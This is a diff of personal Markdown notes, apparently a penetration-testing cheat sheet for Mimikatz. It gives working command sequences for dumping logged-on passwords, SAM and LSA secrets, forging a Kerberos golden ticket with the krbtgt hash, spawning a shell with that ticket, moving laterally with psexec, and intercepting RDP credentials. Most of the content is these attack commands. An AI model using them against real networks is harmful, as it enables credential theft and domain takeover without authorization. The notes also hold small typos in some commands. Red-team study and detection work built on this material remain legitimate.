@@ -1,4 +1,4 @@
-[mimiKatz](https://github.com/gentilkiwi/mimikatz) 
+
 
 # Overview
 
@@ -17,24 +17,39 @@ privilege::debug
 ```
 sekurlsa::logonpasswords # logged in passwords
 ```
-*Sam dumping*
+## *Sam dumping*
 ```
-lsadump::sam (to dump sam file)
+lsadump::sam # (to dump sam file)
 lsadump::sam /patch
 ```
-*LSA dumping*
+## *LSA dumping*
 ```
 lsadump::lsa /patch # dumping lsa
 ```
 
-*Golden Ticket*
+# *Golden Ticket*
+
+^cc25a7
+
 ```
-lsadump::lsa /inject /name:krbtgt (filter wanted user name)
-Copy SID of the domain and kerberos NTLM hash
-kerberos:golden /User:Administrator or any name /domain:DOMAIN /sid:SID /krbtgt:NTLM HASH /id:500 /ptt (pass the ticket)
+privilege::debug
+lsadump::lsa /inject /name:krbtgt # filter wanted user name
 
-misc::cmd (open command line with session we created)
+# Copy SID of the domain and kerberos NTLM hash
 
+kerberos:golden /User:Administrator <or any name> /domain:DOMAIN /sid:<SID> /krbtgt:<NTLM_ _HASH> /id:500 /ptt # pass the ticket
+
+/User: # could be anyname
+/domain: # target domain
+/sid: # domain sid
+/krbtgt: # kerberos tgt ntlm hash
+/id:500 # admin RID
+/ptt: # pass the ticket 
+
+misc::cmd # open command line with session we created
+
+
+# acess other domain users 
 command \\COMPUTER\SHARE or file
 e.g.
 psexec \\ESabah cmd.exe
@@ -42,9 +57,10 @@ psexec \\ESabah cmd.exe
 ```
 
 # RDP 
-
+**Overview:**
 *As the attacker was able to gain the session of the machine, they used Mimikatz and ran the mstsc function inside the ts module. Mstsc is a process that runs when the Remote Desktop service in use. It then intercepts the RDP protocol communication to extract the stored credentials.*
-
+**Attack:**
+- Intercept RDP connection to steal creds 
 ```bash
 
 privielge::debug # checks for my perm to run mimikatz
@@ -73,3 +89,7 @@ password_change     #   Change the password/hash of a user
 
 
 ```
+
+---
+Tags: #mimikatz #AD #hashdump #golden_ticket #silver_ticket #kerberos #pass-the-Ticket #Over-Pass-The-Hash #passhash 
+Resources: [mimiKatz](https://github.com/gentilkiwi/mimikatz) 
